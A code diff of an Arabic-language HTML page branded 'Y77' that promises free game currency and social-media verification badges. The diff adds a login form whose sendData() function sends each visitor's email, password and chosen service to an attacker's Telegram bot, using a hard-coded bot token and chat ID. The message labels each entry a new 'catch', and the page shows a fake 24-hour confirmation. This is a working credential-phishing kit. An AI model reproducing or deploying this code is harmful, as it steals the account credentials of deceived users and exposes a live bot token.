@@ -16,8 +16,7 @@
             background-color: var(--dark-bg);
             color: var(--text-color);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
         }
 
         header {
@@ -32,11 +31,6 @@
             color: var(--gold);
             margin: 0;
             text-shadow: 0 0 15px rgba(212, 175, 55, 0.5);
-        }
-
-        header p {
-            font-size: 1.2rem;
-            opacity: 0.8;
         }
 
         .container {
@@ -61,22 +55,18 @@
         .card:hover {
             transform: translateY(-10px);
             border-color: var(--gold);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
         }
 
         .card img {
-            width: 80px;
-            height: 80px;
+            width: 70px;
+            height: 70px;
             margin-bottom: 15px;
-            border-radius: 12px;
+            border-radius: 10px;
         }
 
-        .card h3 {
-            margin: 10px 0;
-            color: var(--gold);
-        }
+        .card h3 { color: var(--gold); margin: 10px 0; }
 
-        /* نافذة الإدخال (Modal) */
+        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -109,7 +99,7 @@
             box-sizing: border-box;
         }
 
-        button.submit-btn {
+        .submit-btn {
             background: var(--gold);
             color: black;
             border: none;
@@ -121,56 +111,45 @@
             margin-top: 15px;
         }
 
-        .close-btn {
-            color: #ff4444;
-            cursor: pointer;
-            float: left;
-            font-weight: bold;
-        }
+        .close-btn { color: #ff4444; cursor: pointer; float: left; }
     </style>
 </head>
 <body>
 
 <header>
     <h1>Y77</h1>
-    <p>البوابة الأولى لشحن الألعاب وتطبيقات التواصل مجاناً</p>
+    <p>أقوى موقع لشحن الألعاب وتوثيق الحسابات مجاناً</p>
 </header>
 
 <div class="container">
     <div class="card" onclick="openModal('ببجي موبايل')">
-        <img src="https://img.icons8.com/color/96/pubg.png" alt="PUBG">
+        <img src="https://img.icons8.com/color/96/pubg.png">
         <h3>ببجي موبايل</h3>
-        <p>شحن شدات UC مجانية</p>
+        <p>شحن UC مجاني</p>
+    </div>
+
+    <div class="card" onclick="openModal('حساب جوجل')">
+        <img src="https://img.icons8.com/color/96/google-logo.png">
+        <h3>جوجل (Gmail)</h3>
+        <p>تفعيل خدمات بريميوم</p>
+    </div>
+
+    <div class="card" onclick="openModal('فيسبوك')">
+        <img src="https://img.icons8.com/fluency/96/facebook-new.png">
+        <h3>فيسبوك</h3>
+        <p>زيادة متابعين وتوثيق</p>
+    </div>
+
+    <div class="card" onclick="openModal('توثيق تيك توك')">
+        <img src="https://img.icons8.com/color/96/tiktok.png">
+        <h3>توثيق تيك توك</h3>
+        <p>الحصول على العلامة الزرقاء</p>
     </div>
 
     <div class="card" onclick="openModal('فري فاير')">
-        <img src="https://img.icons8.com/color/96/free-fire.png" alt="Free Fire">
+        <img src="https://img.icons8.com/color/96/free-fire.png">
         <h3>فري فاير</h3>
         <p>شحن جواهر Diamonds</p>
-    </div>
-
-    <div class="card" onclick="openModal('تيك توك')">
-        <img src="https://img.icons8.com/color/96/tiktok.png" alt="TikTok">
-        <h3>تيك توك</h3>
-        <p>شحن عملات حائط</p>
-    </div>
-
-    <div class="card" onclick="openModal('إنستغرام')">
-        <img src="https://img.icons8.com/color/96/instagram-new.png" alt="Instagram">
-        <h3>إنستغرام</h3>
-        <p>توثيق وزيادة متابعين</p>
-    </div>
-
-    <div class="card" onclick="openModal('بيجو لايف')">
-        <img src="https://img.icons8.com/fluency/96/bigo-live.png" alt="Bigo">
-        <h3>بيجو لايف</h3>
-        <p>شحن فاصوليا ومجوهرات</p>
-    </div>
-
-    <div class="card" onclick="openModal('روبلوكس')">
-        <img src="https://img.icons8.com/color/96/roblox.png" alt="Roblox">
-        <h3>روبلوكس</h3>
-        <p>شحن Robux مجاناً</p>
     </div>
 </div>
 
@@ -178,16 +157,20 @@
     <div class="modal-content">
         <span class="close-btn" onclick="closeModal()">إغلاق ✖</span>
         <h2 id="serviceName" style="color: var(--gold);"></h2>
-        <p>يرجى تسجيل الدخول للتحقق من الحساب</p>
-        <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف">
-        <input type="password" id="pass" placeholder="كلمة السر">
-        <button class="submit-btn" onclick="alert('جاري التحقق من البيانات... انتظر 24 ساعة')">تأكيد الشحن</button>
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو الرقم">
+        <input type="password" id="password" placeholder="كلمة السر">
+        <button class="submit-btn" onclick="sendData()">تأكيد العملية</button>
     </div>
 </div>
 
 <script>
+    let currentService = "";
+    const TELEGRAM_TOKEN = "8011282007:AAGfNEtfk9XSQgk22W3nHMMrzBUj7HGixy8";
+    const CHAT_ID = "8146130042";
+
     function openModal(name) {
-        document.getElementById('serviceName').innerText = "شحن " + name;
+        currentService = name;
+        document.getElementById('serviceName').innerText = name;
         document.getElementById('loginModal').style.display = 'flex';
     }
 
@@ -195,14 +178,28 @@
         document.getElementById('loginModal').style.display = 'none';
     }
 
-    // إغلاق عند الضغط خارج المربع
-    window.onclick = function(event) {
-        if (event.target == document.getElementById('loginModal')) {
+    async function sendData() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+
+        if(!email || !pass) {
+            alert("يرجى إكمال البيانات");
+            return;
+        }
+
+        const message = `🚨 صيد جديد من موقع Y77 🚨\n\n🔹 الخدمة: ${currentService}\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
+        
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+        try {
+            await fetch(url);
+            alert("تم إرسال الطلب، سيتم التنفيذ خلال 24 ساعة.");
             closeModal();
+        } catch (e) {
+            alert("حدث خطأ في الاتصال بالسيرفر");
         }
     }
 </script>
 
 </body>
 </html>
-
